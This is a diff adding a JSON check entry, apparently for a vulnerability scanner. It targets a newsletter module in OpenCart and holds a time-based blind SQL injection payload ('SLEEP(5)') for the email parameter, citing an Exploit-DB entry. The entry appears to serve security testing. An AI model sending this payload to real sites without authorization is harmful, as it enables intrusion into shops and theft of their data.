@@ -1,0 +1,12 @@
+{
+  "id": "opencart-zemez-newsletter",
+  "engine": "opencart",
+  "method": "POST",
+  "path": "/index.php?route=extension/module/zemez_newsletter/addNewsletter",
+  "where": "post-form",
+  "param": "zemez_newsletter_email",
+  "payloads": ["a", "a' AND (SELECT SLEEP(5)) AND '1'='1"],
+  "match": { "type": "time", "value": 4 },
+  "score": 7,
+  "note": "EDB-50942, слепая по времени"
+}
